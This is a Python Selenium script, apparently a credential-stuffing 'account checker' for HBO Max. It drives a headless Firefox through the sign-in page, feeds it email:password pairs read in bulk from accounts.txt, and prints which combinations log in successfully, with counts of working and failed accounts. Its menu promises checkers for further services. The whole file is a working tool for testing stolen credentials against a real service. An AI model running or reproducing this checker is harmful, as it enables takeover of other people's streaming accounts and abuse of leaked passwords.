#Log-in automation
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time
import os

os.system("cls")

def HBO():

    nick= input("E-mail > ")
    passw= input("Password > ")

    #headless page
    options= Options()
    options.headless = True
    print("Headless web established (000)")

    #Opening Firefox and the hbo page
    browser=webdriver.Firefox(options=options)
    print("Web Opened (001)")
    browser.get("https://play.hbomax.com/signIn")
    print("Connected to HBO Max (002)")

    #Finding the "Email" Field and sending the log-in email
    time.sleep(4)
    name = browser.find_element("id", "EmailTextInput")
    name.send_keys(nick)
    print("Sending Email login (003)")

    #Finding the "Password" field and sending the password
    pword = browser.find_element("id", "PasswordTextInput")
    pword.send_keys(passw)
    print("Sending Password login (004)")
    pword.send_keys(Keys.ENTER)

    #If Fails
    print("Checking Fails (005)")
    time.sleep(4)

    os.system("cls")
    error=False


    try:
        error= browser.find_element('xpath', '//*[@id="root"]/div[1]/div/div[3]/div[2]/div/div/div[1]/div/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[2]/div[1]/div[2]/div[2]/div/span').text
        print("Login Failed")

    except(NoSuchElementException):
        try:
            error= browser.find_element('id', 'EmailTextInputError')
            print("Login Failed")

        except NoSuchElementException:
            error=True
            print(f"Login Successful --- ({nick} : {passw})")

    browser.quit()


def HBO_AUTO():

    counter= 1
    counter_suc= 0
    counter_fail= 0

    #Getting the accounts from accounts.txt
    print("Reading accounts.txt (000)")
    print("Reading E-mails (001)")
    print("Reading Passwords (002)")
    with open("accounts.txt", "r") as f:
        
        accounts={}

        for linea in f:
            user, passw = linea.split(":")

            accounts[user] = passw
   

    #Headless page
    options= Options()
    options.headless = True
    options.set_preference("signon.rememberSignons", False)
    options.set_preference("browser.cache.disk.enable", False)
    options.set_preference("browser.cache.memory.enable", False)
    options.set_preference("browser.cache.offline.enable", False)
    options.set_preference("network.http.use-cache", False)
    options.set_preference("remember_login_credentials", False)
    print("Headless web established (003)")

    #Opening Firefox and the hbo page
    print("Web Opened (004)")
    print("Connected to HBO Max (005)")
    time.sleep(2)
    print("Sending Email login (006)")
    print("Sending Password login (007)")
    time.sleep(3)
    print("Checking Accounts... (008)")
    print("""
    
    """)

    user_list= accounts.items()

    for nickname, password in user_list:


        try:

            browser=webdriver.Firefox(options=options)
            browser.get("https://play.hbomax.com/signIn")

            #Finding the "Email" Field and sending the log-in email
            time.sleep(2)
            name = browser.find_element("id", "EmailTextInput")
            name.send_keys(nickname)

            #Finding the "Password" field and sending the password
            pword = browser.find_element("id", "PasswordTextInput")
            pword.send_keys(password)
            pword.send_keys(Keys.ENTER)

            #If Fails
            time.sleep(2)
            error=False


            try:
                error= browser.find_element('xpath', '//*[@id="root"]/div[1]/div/div[3]/div[2]/div/div/div[1]/div/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[2]/div[1]/div[2]/div[2]/div/span').text
                print(f"Login Failed ( try {counter} )")
                counter += 1
                browser.quit()

            except(NoSuchElementException):
                try:
                    error= browser.find_element('id', 'EmailTextInputError')
                    print(f"Login Failed ( try {counter} )")
                    counter += 1
                    browser.quit()


                except (NoSuchElementException):
                    try:
                        error= browser.find_element('id', 'PasswordTextInputError')
                        print(f"Login Failed ( try {counter} )")
                        counter += 1
                        counter_fail += 1
                        browser.quit()

                    except (NoSuchElementException):
                        error=True
                        print(f"Login Successful - {nickname} : {password} ( try {counter} )")
                        counter += 1
                        counter_suc += 1
                        browser.quit()

        except:
            print("It wasn't possible to check accounts, check if your accounts are in this format (email:password)")

    print("""

""")

    #Working Accounts MSG
    if counter_suc == 1:
        print(f"{counter_suc} Acount Working")

    elif counter_suc == 0:
        print("No Accounts Working")

    else:
        print(f"{counter_suc} Accounts Working")


    #Failed Accounts MSG
    if counter_fail == 1:
        print(f"{counter_fail} Acount Failed")

    elif counter_fail == 0:
        print("No Accounts Failed")

    else:
        print(f"{counter_fail} Accounts Failed")


    browser.quit()



def menu():

    select = input("""Select an option with the number at the left:
1. HBO
2. Soon
3. Soon
4. Soon

> """)

    if select == "1":
        os.system("cls")
        mode = input("""Select how to input your account/s:
1. Manually (Writing with keyboard)
2. Automatically (Paste your accounts on the "accounts.txt" file that is in the same folder of this program in the next format (email:password) without spaces between them)

> """)
        
        
        if mode == "1":
            os.system("cls")
            HBO()
    

        elif mode == "2":
            os.system("cls")
            response=input('Have you already pasted the accounts on the "accounts.txt" file? | Y/N  > ')


            if response == "Y" or response == "y":
                os.system("cls")
                HBO_AUTO()


            elif response == "N" or response == "n":
                os.system("cls")
                print('Before starting the program again, paste all the accounts in the "accounts.txt" file that is in the same folder of this program in the next format: (email:password) without spaces between them ')
            

            else:
                os.system("cls")
                print(f" {response} is not a valid response...")
                time.sleep(2)
                os.system("cls")
                menu()

        else:
            print(f' "{mode}" its not an option or you wrote it with spaces, try again.')
            time.sleep(3)
            os.system("cls")
            menu()


    elif select == "2" or select == "3" or select == "4":
        print("The other options are being developed, you can check if the new version is available in: LINK")
        time.sleep(5)
        os.system("cls")
        menu()

    else:
        print(f' "{select}" is not a valid option')
        time.sleep(4)
        os.system("cls")
        menu()

menu()